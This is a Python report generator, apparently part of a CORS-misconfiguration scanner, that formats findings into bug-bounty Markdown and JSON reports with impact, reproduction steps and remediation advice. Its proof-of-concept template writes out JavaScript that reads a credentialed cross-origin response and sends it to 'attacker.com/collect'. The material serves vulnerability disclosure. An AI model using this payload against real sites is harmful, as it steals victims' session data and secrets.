"""
Report Generator
-----------------
Produces clean Markdown + JSON reports from CORS scan findings.
Output is ready to paste into HackerOne/Bugcrowd reports.
"""

import json
import datetime


SEVERITY_MAP = {
    "reflected":           ("Critical", "Server reflects any attacker-controlled origin"),
    "null_origin":         ("High",     "Null origin accepted — exploitable via sandboxed iframe"),
    "prefix_match":        ("High",     "Origin prefix matching allows subdomain bypass"),
    "suffix_match":        ("High",     "Origin suffix matching allows domain confusion"),
    "subdomain_wild":      ("Medium",   "Any subdomain accepted — requires subdomain takeover or XSS"),
    "wildcard_with_creds": ("Medium",   "Wildcard ACAO with credentials header"),
    "http_downgrade":      ("Medium",   "HTTP scheme accepted — downgrade attack"),
    "trusted_sub_dev":     ("Medium",   "Dev subdomain accepted"),
    "trusted_sub_staging": ("Medium",   "Staging subdomain accepted"),
}

IMPACT_TEMPLATE = """
An attacker can host a malicious page at `{origin}` that makes cross-origin requests
to `{url}` with the victim's session credentials. The server responds with
`Access-Control-Allow-Origin: {acao}` and `Access-Control-Allow-Credentials: {acac}`,
allowing the attacker to read the full response body — including sensitive user data,
API keys, tokens, or session information.
""".strip()

STEPS_TEMPLATE = """
1. Victim visits attacker-controlled page at `{origin}`
2. Page executes JavaScript that sends a cross-origin XHR to `{url}`
3. Request includes `withCredentials: true` (sends victim's session cookies)
4. Server responds with `ACAO: {acao}` — browser allows JS to read response
5. Attacker receives full response body containing sensitive data
""".strip()

REMEDIATION = """
## Remediation

- Maintain an explicit allowlist of trusted origins; do not reflect the `Origin` header dynamically
- Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- Validate the full origin including scheme and port — not just hostname prefix/suffix
- Do not include `null` in allowed origins
- Set `Vary: Origin` header when using dynamic CORS to prevent cache poisoning
- Audit all API endpoints — not just the main domain
""".strip()


def _severity(finding: dict) -> str:
    vtype = finding.get("vuln_type", "")
    acac = finding.get("acac", False)
    if acac and vtype in ("reflected", "null_origin", "prefix_match", "suffix_match"):
        return "Critical"
    return SEVERITY_MAP.get(vtype, ("High", ""))[0]


def generate_markdown_report(findings: list, target: str = "",
                              scanner_origin: str = "https://evil.com") -> str:
    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    lines = []

    lines.append(f"# CORS Misconfiguration Report")
    lines.append(f"\n**Target:** `{target}`  ")
    lines.append(f"**Scan Date:** {now}  ")
    lines.append(f"**Findings:** {len(findings)}  ")
    lines.append(f"**Tool:** cors-exploiter\n")
    lines.append("---\n")

    if not findings:
        lines.append("No exploitable CORS misconfigurations found.\n")
        return "\n".join(lines)

    for i, f in enumerate(findings, 1):
        url     = f.get("url", "")
        origin  = f.get("origin_sent", "")
        acao    = f.get("acao", "")
        acac    = f.get("acac", False)
        vtype   = f.get("vuln_type", "")
        sev     = _severity(f)
        notes   = f.get("notes", [])

        lines.append(f"## Finding #{i} — {sev} — {vtype.replace('_',' ').title()}")
        lines.append(f"\n| Field | Value |")
        lines.append(f"|-------|-------|")
        lines.append(f"| **URL** | `{url}` |")
        lines.append(f"| **Severity** | {sev} |")
        lines.append(f"| **Vulnerability Type** | {vtype} |")
        lines.append(f"| **Origin Tested** | `{origin}` |")
        lines.append(f"| **ACAO Response** | `{acao}` |")
        lines.append(f"| **ACAC Response** | `{str(acac).lower()}` |")
        lines.append(f"| **Vary: Origin** | `{'present' if 'origin' in f.get('vary','').lower() else 'MISSING'}` |\n")

        lines.append("### Impact\n")
        lines.append(IMPACT_TEMPLATE.format(
            origin=origin, url=url, acao=acao, acac=str(acac).lower()
        ))
        lines.append("\n")

        lines.append("### Steps to Reproduce\n")
        lines.append(STEPS_TEMPLATE.format(origin=origin, url=url, acao=acao))
        lines.append("\n")

        if notes:
            lines.append("### Additional Notes\n")
            for note in notes:
                lines.append(f"- {note}")
            lines.append("")

        lines.append("### Proof of Concept\n")
        lines.append("Host the following HTML page at your attacker domain and share the link with the victim:\n")
        lines.append("```html")
        lines.append(f'<script>')
        lines.append(f'  var xhr = new XMLHttpRequest();')
        lines.append(f'  xhr.open("GET", "{url}", true);')
        if acac:
            lines.append(f'  xhr.withCredentials = true;')
        lines.append(f'  xhr.onload = function() {{')
        lines.append(f'    fetch("https://attacker.com/collect?d=" + encodeURIComponent(xhr.responseText));')
        lines.append(f'  }};')
        lines.append(f'  xhr.send();')
        lines.append(f'</script>')
        lines.append("```\n")

        lines.append("---\n")

    lines.append(REMEDIATION)
    return "\n".join(lines)


def save_report(findings: list, target: str = "",
                output_prefix: str = "cors_report") -> dict:
    """Save JSON and Markdown reports."""
    now = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    json_path = f"{output_prefix}_{now}.json"
    md_path   = f"{output_prefix}_{now}.md"

    # JSON
    with open(json_path, "w") as f:
        json.dump({
            "target": target,
            "scan_date": now,
            "finding_count": len(findings),
            "findings": findings
        }, f, indent=2, default=str)

    # Markdown
    md = generate_markdown_report(findings, target)
    with open(md_path, "w") as f:
        f.write(md)

    return {"json": json_path, "markdown": md_path}
